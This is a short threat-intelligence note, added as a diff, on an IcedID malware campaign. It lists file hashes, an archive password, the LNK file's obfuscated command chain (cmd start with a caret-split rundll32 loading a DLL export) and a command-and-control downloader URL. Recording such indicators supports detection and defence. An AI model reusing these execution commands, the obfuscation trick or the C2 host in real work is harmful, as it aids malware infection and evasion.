@@ -1,0 +1,29 @@
+IcedID | 30.09.2022 | Campaign 976968029
+
+***************************************
+
+.zip 0ab12d65800f3e7e6089fe3c534911f0b42d9175bcf955e937edd39e8bb2c13a - pw i5qvLHuI
+.iso 6f554379bc1f32cb72d555e519193d1b891c0a7af15e2ee442dab1fed2719032
+.dll ba9481130c405679401696134cc2b17673d5a064bb0131dfd99c6e74405cc862
+
+***************************************
+
+lnk content
+
+C:\Windows\System32\cmd.exe /c start 73febb25-a241-41d6-8736-4c26ea6932b3.png && start ru^n^d^l^l3^2 2cdb83ee-c76c-4d7c-b9bc-2f4aab08f773.-Tf,PluginInit
+
+***************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\notice-cf9f0bfc-3f0f-4b19-b8ea-dc1a60aa5ef6.lnk
+
+cmd.exe" /c start 73febb25-a241-41d6-8736-4c26ea6932b3.png && start ru^n^d^l^l3^2 2cdb83ee-c76c-4d7c-b9bc-2f4aab08f773.-Tf,PluginInit
+
+rundll32 2cdb83ee-c76c-4d7c-b9bc-2f4aab08f773.-Tf,PluginInit
+
+***************************************
+
+c2 downloader
+
+http://triskawilko.com/
